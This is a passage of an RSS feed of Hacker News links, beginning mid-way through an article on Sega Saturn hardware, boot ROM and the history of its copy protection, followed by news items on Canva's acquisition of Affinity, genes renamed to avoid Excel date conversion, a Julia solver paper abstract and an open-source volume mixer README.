https://www.copetti.org/images/consoles/saturn/ipl/_hu0b5b6c76da3d5b8615c08a00e7e1a69c_75233_452b41409bf1a67d2a7eddf143bc4bd8.webp 640w"><img alt="Image" width="640" height="448" src="https://www.copetti.org/images/consoles/saturn/ipl/logo_jap.763d14af000051f75cda703fa5241e82b6cd215f5adfae9b29f9d8b38a77e2a3.jpg" loading="lazy"></picture></a><figcaption>Japanese version.</figcaption></figure><figure><a href="https://www.copetti.org/images/consoles/saturn/ipl/logo_eu.a03d01269ea4ef59cb3ff04253cc524adbae127b2641a07aeecd311ced809cad.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/ipl/_hu5554528e37891a047104441c80ff122b_73677_d05837062416c3143a9cfd97e52dfcdf.webp 500w,
https://www.copetti.org/images/consoles/saturn/ipl/_hu5554528e37891a047104441c80ff122b_73677_8307edad70d5c14b1c3c2431c593eff6.webp 640w"><img alt="Image" width="640" height="448" src="https://www.copetti.org/images/consoles/saturn/ipl/logo_eu.a03d01269ea4ef59cb3ff04253cc524adbae127b2641a07aeecd311ced809cad.jpg" loading="lazy"></picture></a><figcaption>European and American versions.</figcaption></figure><figcaption>Logo displayed after splash animation finishes.</figcaption></figure><p>Afterwards, the master SH-2’s reset vector is set to <code>0x00000000</code> <sup id="bibref:18"><a href="#bib:games-sh2" role="doc-biblioref">[18]</a></sup>, which points to an internal ROM containing the <strong>Initial Program Loader</strong> (IPL). This program performs the following functions <sup id="bibref:19"><a href="#bib:operating_system-bootrom" role="doc-biblioref">[19]</a></sup>:</p><ol><li>Finish initialising the hardware.</li><li>If there’s a cartridge inserted and it includes a program, continue booting from there.</li><li>If the ‘Video CD’ card is inserted, boot it.</li><li>If there’s a disc inserted, check that it’s genuine.<ul><li>While at it, it displays the splash screen animation.</li></ul></li><li>If the disc is genuine, boot the game.</li><li>If the disc is not genuine or there’s no disc inserted, run the shell.</li></ol><h3 id="interactive-shell">Interactive shell</h3><p>Alternatively to playing games, the Saturn included a music player called ‘Multiplayer’, from which a save manager can be opened.</p><p>If a Video CD card is inserted, the player can reproduce MPEG video decoded from the card itself.</p><h3 id="no-bios">No BIOS?</h3><p>Unlike the <a href="https://www.copetti.org/writings/consoles/playstation/">PlayStation</a> whose ROM chip bundled a <a href="https://www.copetti.org/writings/consoles/playstation/#operating-system">BIOS</a>, which in turn exposed APIs for programmers to use. The Saturn’s ROM is often called ‘IPL’ presumably since its main job is to bootstrap the game and run the shell. However, the latter still stores some routines (called <strong>services</strong>) to manipulate the hardware (such as managing save data and power control). It even implements a ‘semaphore’! (used to synchronise operations that involve multiple processors at the same time). Hence, that part of the ROM is called <strong>System program</strong>.</p><hr><h2 id="games">Games</h2><p>Official Sega Saturn games are loaded from the <strong>2x CD-ROM reader</strong>. Its medium, the compact disc (CD), has a capacity of <strong>680 MB</strong> and Sega Saturn games follow the <strong>ISO 9660</strong> standard for storing data <sup id="bibref:20"><a href="#bib:games-format" role="doc-biblioref">[20]</a></sup>. Additionally, many games store audio tracks next to the data tracks for streaming uncompressed audio while executing the game.</p><h3 id="the-compact-disc-cd">The Compact Disc (CD)</h3><p>The CD is an optical medium where information is stored by engraving <strong>pits</strong> and <strong>lands</strong> on its polycarbonate surface <sup id="bibref:21"><a href="#bib:cpu-optical" role="doc-biblioref">[21]</a></sup>. Then, an infrared light is beamed from the reader and the reflection produced on the CD’s surface is used to read the information back.</p><p>The process of converting digital information (ones and zeroes) into pits and lands and vice versa is not simple by any means, especially since CDs must be robust enough to sustain day-to-day damage and intensive use; and reliable enough to store any kind of information without fear of data loss. Hence, as part of its specification, data is encoded using the <strong>Non-Return-to-Zero inverted</strong> (NRZi) model, meaning that the bitstream will be all zeroes until a land-to-pit or pit-to-land change is detected, at which a <code>1</code> will be appended instead.</p><p>This design works well until the reader encounters a sequence of ones (continuous pit and land changes) or long sequences of zeroes (constant pits or lands), at which the sensor will struggle to detect or keep synchronised, respectively. Thus, an additional model called <strong>Eight-to-Fourteen</strong> (ETF) modulation is applied. With this, a handful of zeroes are padded in-between the encodings, these help the sensor during the reading process.</p><p>On top of all this, further mechanisms of error detection may be added, although these are beyond the scope of this article. If you are interested in learning more, you can check out a slide presentation from RWTH Aachen University <sup id="bibref:22"><a href="#bib:cpu-optical" role="doc-biblioref">[22]</a></sup>.</p><h3 id="development">Development</h3><p>At first, Sega didn’t provide complete software libraries and development tools (in fact, the initial documentation was inaccurate) so the only way to achieve good performance was through <em>harsh</em> assembly.</p><p>Later on, Sega released complete SDKs, hardware kits and some libraries to ease I/O and graphics operations. Overall, games are written in a mix of <strong>C</strong> and various assemblies targeting individual components.</p><h3 id="io">I/O</h3><p>Peripheral management and real-time clock are also provided by the aforementioned <strong>System Management &amp; Peripheral Control</strong> (SMPC). The SMPC is controlled with commands sent by the SH-2s.</p><h3 id="expansion-methods">Expansion methods</h3><p>This console bundles a considerable number of external connectors and interfaces that only received a handful of uses, at most.</p><ul><li>Behind the drive there’s a <strong>cartridge slot</strong> officially used for <strong>additional storage</strong> (save data) or <strong>extra RAM</strong>. In Japan and the United Stated, a modem was also offered to provide <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#early-network-attempts">online functionality</a>.</li><li>At the back of the console, there’s a slot for a <strong>Video CD Card</strong> that performs MPEG decompression for programs/games that support it.</li><li>Finally, there’s a mysterious socket at the back of the console called <strong>Communication Connector</strong>. Sega didn’t publish any documentation for developers, but after some reverse engineering efforts, people discovered that it’s connected to the SCSP’s MIDI pins and the two SH-2’s serial interface (SCI) <sup id="bibref:23"><a href="#bib:games-development" role="doc-biblioref">[23]</a></sup>. In any case, Sega released a Floppy drive that relied on this interface.</li></ul><hr><h2 id="anti-piracy-homebrew">Anti-Piracy &amp; Homebrew</h2><p>In response to the easiness of cloning a CD, Saturn added a copy protection system (along with region locking) to control the distribution of games.</p><p>Copy protection on CDs is applied by burning special data (called ‘system area’) out of reach from conventional burners, the Saturn refuses to boot the disc as a ‘game disc’ if the out-of-reach data is not found or it’s invalid. The disc reader also contains a custom <strong>SH-1</strong> processor that interfaces with the rest of the console using obscured protocols.</p><p>It’s worth mentioning that since Saturn CDs follow the ISO9660 (a standard file system for CD data), PCs can read the game disc without problems (but, of course, they can’t execute the game unless they use an emulator).</p><h3 id="defeat">Defeat</h3><p>First of all, the classic method used for disabling the copy protection consisted in installing a <strong>mod-chip</strong> that could trick the CD reader when a burned disc is inserted. There was also a ‘swap trick’ that consisted in <strong>hot-swapping</strong> a genuine disc with a burned one just after the protection checks passed… with the risk of damaging the drive!</p><p>After the turn of the century, alternative but more sophisticated methods used for running unauthorised code were discovered, for instance:</p><ul><li>An <strong>exploit in the copy protection mechanism</strong> was found and it allowed to boot up any disc game without going through the copy protection checks. This was subsequently in the form of a cartridge called <strong>pseudosaturn</strong> <sup id="bibref:24"><a href="#bib:anti_piracy-pseudosaturn" role="doc-biblioref">[24]</a></sup>. Due to the use of the cartridge medium, Action Replay cartridges are often re-flashed with pseudosaturn (though the flasher also needs to be bootstrapped somehow, most commonly through the swap trick).<ul><li>This method is still being used as of 2022, although a new fork of pseudosaturn named ‘Pseudo Saturn Kai’ is installed instead.</li></ul></li><li>Another method was reported in 2016 (almost 20 years later) by exploiting the fact that the <strong>Video CD add-on can inject unencrypted code</strong> to the CD subsystem (bypassing the CD reader altogether). This finally allowed users to load Homebrew independently of the ageing drive. The Video CD exploit is commercially distributed in a product called ‘Satiator’ (I’m not sponsored, by the way).</li><li>Finally, there’s another commercial alternative that replaces the CD reader with an SD or SATA adapter. The Saturn still thinks it’s reading from a CD, but the ‘CD’ is being emulated by the adapter, which is in turn reading from a disc image <sup id="bibref:25"><a href="#bib:anti_piracy-ode" role="doc-biblioref">[25]</a></sup>. These products are called <strong>Optical Drive Emulators</strong> (ODE).</li></ul><hr><h2 id="thats-all-folks">That’s all folks</h2><figure><a href="https://www.copetti.org/images/consoles/saturn/mine.e96ef88708e597771584d2cdab33134986934020e7863ce6293b17d999d16ae0.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/_hu42db0004e070320862ad06f7d95006f4_128861_0881f77d5a3134ba6187a6473d340b74.webp 500w,
https://www.copetti.org/images/consoles/saturn/_hu42db0004e070320862ad06f7d95006f4_128861_40622bc6f8adc42b1af72fb7df93ea74.webp 800w,
https://www.copetti.org/images/consoles/saturn/_hu42db0004e070320862ad06f7d95006f4_128861_39af2a2402e6d9876b3cc80769b4cdac.webp 1111w"><img alt="Image" width="1111" height="799" src="https://www.copetti.org/images/consoles/saturn/mine.e96ef88708e597771584d2cdab33134986934020e7863ce6293b17d999d16ae0.jpg" loading="lazy"></picture></a><figcaption>A Japanese Saturn I acquired to get more material for this article. While the games look fine, it was thanks to the Saturn’s enormous Homebrew library that I was able to understand the real capabilities of this console.</figcaption></figure></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Francis Scott Key Bridge in Baltimore, Maryland Has Collapsed (704 pts)]]></title>
            <link>https://twitter.com/sentdefender/status/1772514015790477667</link>
            <guid>39825033</guid>
            <pubDate>Tue, 26 Mar 2024 07:25:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/sentdefender/status/1772514015790477667">https://twitter.com/sentdefender/status/1772514015790477667</a>, See on <a href="https://news.ycombinator.com/item?id=39825033">Hacker News</a></p>
Couldn't get https://twitter.com/sentdefender/status/1772514015790477667: Error: Request failed with status code 400]]></description>
        </item>
        <item>
            <title><![CDATA[Chess puzzle, but you are what you capture (106 pts)]]></title>
            <link>https://echochess.com</link>
            <guid>39824335</guid>
            <pubDate>Tue, 26 Mar 2024 04:46:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://echochess.com">https://echochess.com</a>, See on <a href="https://news.ycombinator.com/item?id=39824335">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <header>
        <img src="https://echochess.com/img/daily-echo-chess-logo.svg" alt="echo chess daily version logo" width="13%" height="auto">
        
      </header>
      <main>
        <p>
          You are what you eat.<br>
          Can you clear the board?
        </p>
        
        <div>
          <p><a href="#" id="classicLink">DAILY CLASSIC</a>
          <a href="#" id="epicLink">DAILY EPIC </a>
          <a href="https://echochess.com/game.html?endless">ZEN MODE</a>
        </p></div>
        <a href="https://echochess.com/archives.html">
          <img src="https://echochess.com/img/archive.svg" alt="archives" width="49" height="49">
        </a>


        <a href="https://discord.gg/9USPkmtGUz" target="_blank">
          <img src="https://echochess.com/img/discordB.svg" alt="discord">
        </a>


        <p>© 2024 Echo Chunk</p>

      </main>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Canva acquires Affinity, its biggest acquisition, to compete with Adobe (281 pts)]]></title>
            <link>https://finance.yahoo.com/news/canva-acquires-affinity-design-suite-004813952.html</link>
            <guid>39824191</guid>
            <pubDate>Tue, 26 Mar 2024 04:05:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://finance.yahoo.com/news/canva-acquires-affinity-design-suite-004813952.html">https://finance.yahoo.com/news/canva-acquires-affinity-design-suite-004813952.html</a>, See on <a href="https://news.ycombinator.com/item?id=39824191">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>(Bloomberg) -- Canva Inc. acquired the Affinity suite of creative software popular with Mac and iPad users, securing a major acquisition to compete with Adobe Inc.</p><p>Most Read from Bloomberg</p><ul><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/trump-bond-reduced-to-175-million-as-he-appeals-ny-fine?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Trump Vows to Pay Fraud Trial Bond Cut by 68% to $175 Million;elm:context_link;itc:0;sec:content-canvas">Trump Vows to Pay Fraud Trial Bond Cut by 68% to $175 Million</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/donald-trump-6-4-billion-net-worth-makes-him-one-of-world-s-richest-people?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Trump’s Net Worth Hits $6.5 Billion, Making Him One of World’s 500 Richest People;elm:context_link;itc:0;sec:content-canvas">Trump’s Net Worth Hits $6.5 Billion, Making Him One of World’s 500 Richest People</a></p></li><li><p><a href="https://www.bloomberg.com/opinion/articles/2024-03-25/after-exposing-realtors-eliminate-the-mortgage-interest-deduction?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:After Exposing Realtors, Eliminate the Mortgage Interest Deduction;elm:context_link;itc:0;sec:content-canvas">After Exposing Realtors, Eliminate the Mortgage Interest Deduction</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/boeing-ceo-calhoun-commercial-head-deal-to-step-down?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Boeing CEO to Step Down in Overhaul Sparked by Safety Crisis;elm:context_link;itc:0;sec:content-canvas">Boeing CEO to Step Down in Overhaul Sparked by Safety Crisis</a></p></li></ul><p>The deal marks a milestone for an Australian startup last valued at $26 billion. By adding the 90-person team of Nottingham, UK-based Serif, Canva is augmenting a portfolio of artificial intelligence-powered design tools with photo-editing, publishing and illustration software. Affinity’s apps have been featured in Apple Inc.’s presentations of creative products.</p><p>Founded about a decade ago, Canva has grown into the most capable competitor to Adobe, the longtime dominant provider of software for graphics professionals. Adobe has added AI features throughout its products recently, but its shares have fallen about 15% this year after a $20 billion deal to acquire Figma fell through in December.</p><p>Investors have long viewed Canva as a candidate to go public, though the company hasn’t discussed plans for doing so. The company recently completed a share sale valuing it at around $26 billion.</p><p>Read More: Canva Unveils AI Design Tools as Competition From Adobe Heats Up</p><p>The startup, which has focused on making easy-to-use products targeted at people without formal design training, surpassed $2 billion in annualized revenue in 2023 and has over 175 million users. It added over 90 million new users over the past 18 months, helped by new AI features.</p><p>The Australian upstart has acquired six other companies in Europe, including visual AI startup Kaleido.ai and image providers Pexels and Pixabay, as it looks to expand its presence on the continent.</p><p>Most Read from Bloomberg Businessweek</p><ul><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/hong-kong-retirees-choose-mainland-retirement-homes?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Hong Kong’s Elderly Increasingly Opt to Retire in Mainland China;elm:context_link;itc:0;sec:content-canvas">Hong Kong’s Elderly Increasingly Opt to Retire in Mainland China</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-21/ozempic-wegovy-cost-drives-weight-loss-patients-to-pricey-off-ramp?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Weight-Loss-Drug Users Pay Up for Help Ditching the Pricey Meds;elm:context_link;itc:0;sec:content-canvas">Weight-Loss-Drug Users Pay Up for Help Ditching the Pricey Meds</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-21/nvidia-meta-stock-gains-turn-magnificent-seven-into-two?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Magnificent Seven? It’s More Like the Blazing Two and Tepid Five;elm:context_link;itc:0;sec:content-canvas">Magnificent Seven? It’s More Like the Blazing Two and Tepid Five</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-21/billionares-musk-griffin-ellison-embrace-trump-and-chaos?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Wall Street and Silicon Valley Elites Are Warming Up to Trump;elm:context_link;itc:0;sec:content-canvas">Wall Street and Silicon Valley Elites Are Warming Up to Trump</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-22/business-schools-still-lag-on-diversity-despite-stated-goals?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Business Schools Still Lag on Diversity, Despite Stated Goals;elm:context_link;itc:0;sec:content-canvas">Business Schools Still Lag on Diversity, Despite Stated Goals</a></p></li></ul><p>©2024 Bloomberg L.P.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists rename genes to stop Microsoft Excel from misreading them as dates (151 pts)]]></title>
            <link>https://www.theverge.com/2020/8/6/21355674/human-genes-rename-microsoft-excel-misreading-dates</link>
            <guid>39824100</guid>
            <pubDate>Tue, 26 Mar 2024 03:47:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2020/8/6/21355674/human-genes-rename-microsoft-excel-misreading-dates">https://www.theverge.com/2020/8/6/21355674/human-genes-rename-microsoft-excel-misreading-dates</a>, See on <a href="https://news.ycombinator.com/item?id=39824100">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><em><strong>Update October 24th, 2023, 11:25AM ET:</strong> Microsoft </em><a href="https://www.theverge.com/2023/10/21/23926585/microsoft-excel-misreading-dates-human-genes-conversion-fixed"><em>has updated Excel on Windows and macOS</em></a>,<em> adding a toggle to </em><a href="https://insider.microsoft365.com/en-us/blog/control-data-conversions-in-excel-for-windows-and-mac"><em>turn off automatic data conversion</em></a><em>. The original version of this article continues below.</em></p></div><p>There are tens of thousands of genes in the human genome: minuscule twists of DNA and RNA that combine to express all of the traits and characteristics that make each of us unique. Each gene is given a name and alphanumeric code, known as a symbol, which scientists use to coordinate research. But over the past year or so, some 27 human genes have been renamed, all because Microsoft Excel kept misreading their symbols as dates.</p><p>The problem isn’t as unexpected as it first sounds. Excel is a behemoth in the spreadsheet world and is regularly used by scientists to track their work and even conduct clinical trials. But its default settings were designed with more mundane applications in mind, so when a user inputs a gene’s alphanumeric symbol into a spreadsheet, like MARCH1 — short for “<a href="https://www.genenames.org/data/gene-symbol-report/#!/hgnc_id/HGNC:26077">Membrane Associated Ring-CH-Type Finger 1</a>” — Excel converts that into a date: 1-Mar. </p><div><p>Studies found a fifth of genetic data in papers was affected by Excel errors</p></div><p>This is extremely frustrating, even dangerous, corrupting data that scientists have to sort through by hand to restore. It’s also surprisingly widespread and affects even peer-reviewed scientific work. One study <a href="https://genomebiology.biomedcentral.com/articles/10.1186/s13059-016-1044-7">from 2016</a> examined genetic data shared alongside 3,597 published papers and found that roughly one-fifth had been affected by Excel errors. </p><p>“It’s really, really annoying,” Dezső Módos, a systems biologist at the Quadram Institute in the UK, told <em>The Verge</em>. Módos, whose job involves analyzing freshly sequenced genetic data, says Excel errors happen all the time, simply because the software is often the first thing to hand when scientists process numerical data. “It’s a widespread tool and if you are a bit computationally illiterate you will use it,” he says. “During my PhD studies I did as well!”</p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="Examples of gene symbols being rendered as dates in Microsoft Excel. " loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/376x259/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/384x265/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/415x286/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/480x331/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/540x373/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/640x442/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/750x518/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/828x571/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1080x745/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1200x828/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1440x994/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1920x1325/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/2048x1413/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/2400x1656/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/2400x1656/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>Examples of gene symbols being rendered as dates in Microsoft Excel. </em></figcaption> <p><cite>GIF: The Verge</cite></p></div></div><p>There’s no easy fix, either. Excel doesn’t offer the option to turn off this auto-formatting, and the only way to avoid it is to&nbsp;<a href="https://go.redirectingat.com/?xs=1&amp;id=1025X1701640&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DSppKiKIdCkI%26feature%3Dyoutu.be">change the data type</a>&nbsp;for individual columns<em>. </em>Even then, a scientist might fix their data but export it as a CSV file without saving the formatting. Or, another scientist might load the data without the correct formatting, changing gene symbols back into dates. The end result is that while knowledgeable Excel users can avoid this problem, it’s easy for mistakes to be introduced.</p><p>Help has arrived, though, in the form&nbsp;of the scientific body in charge of standardizing the names of genes, the HUGO Gene Nomenclature Committee, or HGNC. This week, the HGNC published new <a href="https://www.nature.com/articles/s41588-020-0669-3">guidelines</a> for gene naming, including for “symbols that affect data handling and retrieval.” From now on, they say, human genes and the proteins they expressed will be named with one eye on Excel’s auto-formatting. That means the symbol MARCH1 has now become MARCHF1, while SEPT1 has become SEPTIN1, and so on. A record of old symbols and names will be stored by HGNC to avoid confusion in the future. </p><p>So far, the names of some 27 genes have been changed like this over the past year, Elspeth Bruford, the coordinator of HGNC, tells <em>The Verge, </em>but the guidelines themselves weren’t formally announced until this week. “We consulted the respective research communities to discuss the proposed updates, and we also notified researchers who had published on these genes specifically when the changes were being put into effect,” says Bruford.</p><p>As Bruford makes clear, the art of naming genes is very much driven by consensus. Like the lexicographers charged with updating dictionaries, the Gene Nomenclature Committee has to be sensitive to the needs of those individuals who will be most affected by their work.</p><p>This wasn’t always the case, mind. In the early, frontier days of genetics, gene naming was often a <a href="https://psmag.com/environment/sonic-hedgehog-dicer-problem-naming-genes-91386">playground for creative scientists</a>, leading to notorious genes like “sonic hedgehog” (yes, named for <em>that S</em>onic) and “Indy” (short for “I’m not dead yet”; a reference to the gene’s function, which can double the life span of fruit flies when mutated). </p><p>Now, though, the HGNC has taken matters firmly in hand, and current guidelines don’t cede much ground to whimsy or ego. The focus is on practical concerns: how do we minimize confusion? For that reason, gene symbols should be unique, and gene names should be brief and specific, says the committee. They cannot use subscript or superscript; can only contain Latin letters and Arabic numerals; and should not spell out names or words, particularly offensive ones (a rule that should hold true “ideally in any language”).</p><div><p>Gene names should avoid offense “ideally in any language”</p></div><p>And while the decision to rename genes is not taken lightly, it’s not unusual, says Bruford. Many gene symbols that can be read as nouns have been renamed to avoid false positives during searches, for example. In the past, CARS has become CARS1, WARS changed to WARS1, and MARS tweaked to MARS1. Other changes have been made to avoid insult. </p><p>“We always have to imagine a clinician having to explain to a parent that their child has a mutation in a particular gene,” says Bruford. “For example, HECA used to have the gene name ‘headcase homolog (Drosophila),’ named after the equivalent gene in fruit fly, but we changed it to&nbsp;‘hdc homolog, cell cycle regulator’ to avoid potential offense.”</p><p>But Bruford says this is the first time that the guidelines have been rewritten specifically to counter the problems caused by software. So far, the reactions seem to be extremely positive — some would even say joyous. </p><p>After geneticist Janna Hutz shared the relevant section of HGNC’s new guidelines on Twitter, the response from the community was jubilant. “THRILLED by this announcement by the Human Gene Nomenclature Committee,” <a href="https://twitter.com/jannahutz/status/1290666010228514824">tweeted</a> Hutz herself. “Finally!!!” <a href="https://twitter.com/HegdeMudra/status/1290969706044719104">responded</a> Mudra Hegde, a computational biologist at the Broad Institute in Massachusetts. “Greatest news of the day!” <a href="https://twitter.com/ScienceSid1/status/1290811922338676737">said</a> a pseudonymous Twitter user. </p><div><p>Why did Microsoft win in a fight against human genetics?</p></div><p>Bruford notes that there has been some dissent about the decision, but it mostly seems to be focused on a single question: why was it easier to rename human genes than it was to change how Excel works? Why, exactly, in a fight between Microsoft and the entire genetics community, was it the scientists who had to back down? </p><p>Microsoft did not respond to a request for comment, but Bruford’s theory is that it’s simply not worth the trouble to change. “This is quite a limited use case of the Excel software,” she says. “There is very little incentive for Microsoft to make a significant change to features that are used extremely widely by the rest of the massive community of Excel users.”</p><p>Bruford doesn’t seem bitter about the situation, though. After all, she says, it wouldn’t do to wait on a hypothetical Excel update to fix these problems when a long-term solution can be introduced by scientists themselves. Microsoft Excel may be fleeting, but human genes will be around for as long as we are. It’s best to give them names that work.</p><p><em><strong>Correction: </strong>The story has been corrected to clarify that Excel users can save spreadsheets that retain their formatting, avoiding the mistake where gene symbols are changed into dates. We regret the error.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nonlinearsolve.jl: Fast and Robust Solvers for Nonlinear Equations in Julia (137 pts)]]></title>
            <link>https://arxiv.org/abs/2403.16341</link>
            <guid>39824019</guid>
            <pubDate>Tue, 26 Mar 2024 03:27:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2403.16341">https://arxiv.org/abs/2403.16341</a>, See on <a href="https://news.ycombinator.com/item?id=39824019">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2403.16341">View PDF</a>
    <a href="https://arxiv.org/html/2403.16341v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Efficiently solving nonlinear equations underpins numerous scientific and engineering disciplines, yet scaling these solutions for complex system models remains a challenge. This paper presents NonlinearSolve.jl - a suite of high-performance open-source nonlinear equation solvers implemented natively in the Julia programming language. NonlinearSolve.jl distinguishes itself by offering a unified API that accommodates a diverse range of solver specifications alongside features such as automatic algorithm selection based on runtime analysis, support for GPU-accelerated computation through static array kernels, and the utilization of sparse automatic differentiation and Jacobian-free Krylov methods for large-scale problem-solving. Through rigorous comparison with established tools such as Sundials and MINPACK, NonlinearSolve.jl demonstrates unparalleled robustness and efficiency, achieving significant advancements in solving benchmark problems and challenging real-world applications. The capabilities of NonlinearSolve.jl unlock new potentials in modeling and simulation across various domains, making it a valuable addition to the computational toolkit of researchers and practitioners alike.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Avik Pal [<a href="https://arxiv.org/show-email/5bb6e4fe/2403.16341">view email</a>]      <br>    <strong>[v1]</strong>
        Mon, 25 Mar 2024 00:31:21 UTC (4,909 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Deej: An open-source hardware volume mixer for Windows and Linux (159 pts)]]></title>
            <link>https://github.com/omriharel/deej</link>
            <guid>39823373</guid>
            <pubDate>Tue, 26 Mar 2024 01:29:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/omriharel/deej">https://github.com/omriharel/deej</a>, See on <a href="https://news.ycombinator.com/item?id=39823373">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">deej</h2><a id="user-content-deej" aria-label="Permalink: deej" href="#deej"></a></p>
<p dir="auto">deej is an <strong>open-source hardware volume mixer</strong> for Windows and Linux PCs. It lets you use real-life sliders (like a DJ!) to <strong>seamlessly control the volumes of different apps</strong> (such as your music player, the game you're playing and your voice chat session) without having to stop what you're doing.</p>
<p dir="auto"><strong>Join the <a href="https://discord.gg/nf88NJu" rel="nofollow">deej Discord server</a> if you need help or have any questions!</strong></p>
